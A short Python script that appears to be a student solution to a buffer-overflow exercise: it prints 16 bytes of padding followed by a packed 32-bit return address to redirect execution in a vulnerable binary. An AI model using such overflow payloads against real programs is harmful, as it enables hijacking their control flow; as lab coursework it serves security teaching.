#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here
padding = b'\x00' * 16
print (padding +pack("<I", 0x080488c5))
